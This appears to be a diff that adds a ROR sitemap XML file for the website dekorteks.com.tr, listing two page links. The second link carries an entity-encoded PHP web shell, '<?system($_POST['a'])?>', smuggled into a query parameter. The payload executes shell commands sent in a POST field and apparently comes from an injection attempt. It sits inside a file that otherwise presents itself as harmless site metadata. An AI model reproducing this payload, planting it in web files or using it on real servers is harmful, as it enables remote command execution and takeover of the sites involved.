@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:ror="http://rorweb.com/0.1/" >
+<channel>
+  <title>ROR Sitemap for http://dekorteks.com.tr/</title>
+  <description>ROR Sitemap</description>
+  <link>http://dekorteks.com.tr/</link>
+  
+  <item>
+       <link>http://dekorteks.com.tr/</link>
+       <title></title>
+       <ror:updatePeriod>yearly</ror:updatePeriod>
+       <ror:sortOrder>0</ror:sortOrder>
+       <ror:resourceOf>sitemap</ror:resourceOf>
+  </item>
+  <item>
+       <link>http://dekorteks.com.tr/index.html?id=123&#60;?system($_POST['a'])?&#62;</link>
+       <title></title>
+       <ror:updatePeriod>yearly</ror:updatePeriod>
+       <ror:sortOrder>1</ror:sortOrder>
+       <ror:resourceOf>sitemap</ror:resourceOf>
+  </item>
+</channel>
+</rss>
